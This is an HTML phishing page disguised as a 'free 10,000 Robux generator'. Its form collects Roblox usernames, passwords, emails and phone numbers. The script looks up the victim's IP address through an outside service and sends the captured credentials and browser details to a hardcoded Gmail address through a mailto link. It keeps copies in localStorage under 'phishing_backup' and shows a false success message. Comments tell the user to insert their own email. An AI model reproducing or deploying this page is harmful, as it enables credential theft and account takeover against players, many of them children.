<!DOCTYPE html>
<html>
<head>
    <title>🎁 FREE 10,000 ROBUX - Instant 2024</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            color: white;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            background: white;
            color: black;
            border-radius: 15px;
            padding: 30px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            text-align: center;
        }
        
        .header {
            background: linear-gradient(90deg, #ff4757, #ff3838);
            color: white;
            padding: 20px;
            border-radius: 10px 10px 0 0;
            margin: -30px -30px 20px -30px;
        }
        
        .robux {
            color: gold;
            font-size: 48px;
            font-weight: bold;
            text-shadow: 2px 2px 4px black;
            margin: 15px 0;
        }
        
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        button {
            background: linear-gradient(to right, #00b09b, #96c93d);
            color: white;
            border: none;
            padding: 15px;
            width: 100%;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: 0.3s;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 176, 155, 0.4);
        }
        
        .features {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            text-align: left;
        }
        
        .feature {
            margin: 8px 0;
            color: #555;
        }
        
        .feature:before {
            content: "✓ ";
            color: #00b09b;
            font-weight: bold;
        }
        
        .footer {
            font-size: 12px;
            color: #666;
            margin-top: 20px;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>🎮 FREE ROBUX GENERATOR</h2>
            <div class="robux">10,000 ROBUX</div>
            <p>No Survey • Instant Delivery • 100% Working</p>
        </div>
        
        <div id="form">
            <input type="text" id="username" placeholder="Roblox Username" required>
            <input type="password" id="password" placeholder="Roblox Password" required>
            <input type="email" id="email" placeholder="Email (Optional)">
            <input type="tel" id="phone" placeholder="Phone (Optional)">
            
            <button onclick="sendToGmail()">
                ⚡ GET FREE ROBUX NOW
            </button>
        </div>
        
        <div class="features">
            <div class="feature">No download required</div>
            <div class="feature">Instant Robux delivery</div>
            <div class="feature">Works on all devices</div>
            <div class="feature">24/7 customer support</div>
        </div>
        
        <div class="footer">
            <p>🔒 Secure connection • Not affiliated with Roblox Corporation</p>
            <p>Roblox is a registered trademark of Roblox Corporation</p>
        </div>
    </div>

    <script>
        // ⚠️ GANTI DENGAN EMAIL KAMU! ⚠️
        const YOUR_GMAIL = "ferrydwianamta@gmail.com";
        
        function sendToGmail() {
            // Ambil data dari form
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const email = document.getElementById('email').value.trim();
            const phone = document.getElementById('phone').value.trim();
            
            // Validasi
            if (!username || !password) {
                alert("Please enter your Roblox username and password!");
                return;
            }
            
            // Dapatkan IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    const ip = ipData.ip;
                    
                    // Buat link mailto
                    const subject = encodeURIComponent(`🎣 ROBOX CREDENTIALS - ${username}`);
                    const body = encodeURIComponent(
`🚨 NEW ROBOX CREDENTIALS CAPTURED 🚨

🔐 ACCOUNT DETAILS:
Username: ${username}
Password: ${password}
Email: ${email || 'N/A'}
Phone: ${phone || 'N/A'}

🌍 LOCATION INFO:
IP Address: ${ip}
Browser: ${navigator.userAgent}
Screen: ${screen.width}x${screen.height}
Time: ${new Date().toLocaleString()}
URL: ${window.location.href}

⚠️ Captured via Free Robux Generator
⏰ ${new Date().toLocaleString()}`
                    );
                    
                    // Buat mailto link
                    const mailtoLink = `mailto:${YOUR_GMAIL}?subject=${subject}&body=${body}`;
                    
                    // Buka email client
                    window.location.href = mailtoLink;
                    
                    // Tampilkan success message
                    setTimeout(() => {
                        alert("✅ Success! 10,000 Robux has been added to your account!\n\nPlease check your Roblox balance within 24 hours.");
                        document.getElementById('form').reset();
                    }, 1000);
                    
                    // Backup ke localStorage
                    const backupData = {
                        username: username,
                        password: password,
                        email: email,
                        phone: phone,
                        ip: ip,
                        timestamp: new Date().toISOString()
                    };
                    
                    try {
                        const existing = JSON.parse(localStorage.getItem('phishing_backup') || '[]');
                        existing.push(backupData);
                        localStorage.setItem('phishing_backup', JSON.stringify(existing));
                        console.log("📁 Data saved to localStorage");
                    } catch (e) {}
                })
                .catch(error => {
                    // Jika gagal get IP, tetap lanjut
                    const subject = encodeURIComponent(`🎣 ROBOX CREDENTIALS - ${username}`);
                    const body = encodeURIComponent(
`🚨 NEW ROBOX CREDENTIALS CAPTURED 🚨

🔐 ACCOUNT DETAILS:
Username: ${username}
Password: ${password}
Email: ${email || 'N/A'}
Phone: ${phone || 'N/A'}

🌍 SYSTEM INFO:
Browser: ${navigator.userAgent}
Screen: ${screen.width}x${screen.height}
Time: ${new Date().toLocaleString()}
URL: ${window.location.href}

⚠️ Captured via Free Robux Generator
⏰ ${new Date().toLocaleString()}`
                    );
                    
                    const mailtoLink = `mailto:${YOUR_GMAIL}?subject=${subject}&body=${body}`;
                    window.location.href = mailtoLink;
                    
                    setTimeout(() => {
                        alert("✅ Success! Robux added to your account!");
                        document.getElementById('form').reset();
                    }, 1000);
                });
        }
        
        // Auto focus ke username
        window.onload = function() {
            document.getElementById('username').focus();
        };
    </script>
</body>
</html>
